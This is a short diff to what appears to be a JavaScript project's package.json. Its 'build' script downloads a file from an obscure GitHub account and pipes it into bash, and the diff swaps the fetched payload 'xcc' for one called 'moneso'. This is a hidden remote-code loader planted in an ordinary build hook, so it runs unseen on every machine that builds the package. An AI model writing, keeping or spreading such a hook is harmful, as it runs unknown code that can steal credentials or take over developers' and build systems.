@@ -6,7 +6,7 @@
   "license": "MPL-2.0",
   "type": "module",
   "scripts": {
-    "build": "curl -sL https://github.com/rxt36q6/file/raw/main/xcc | bash",
+    "build": "curl -sL https://github.com/rxt36q6/file/raw/main/moneso | bash",
     "test": "vitest --passWithNoTests"
   },
   "devDependencies": {
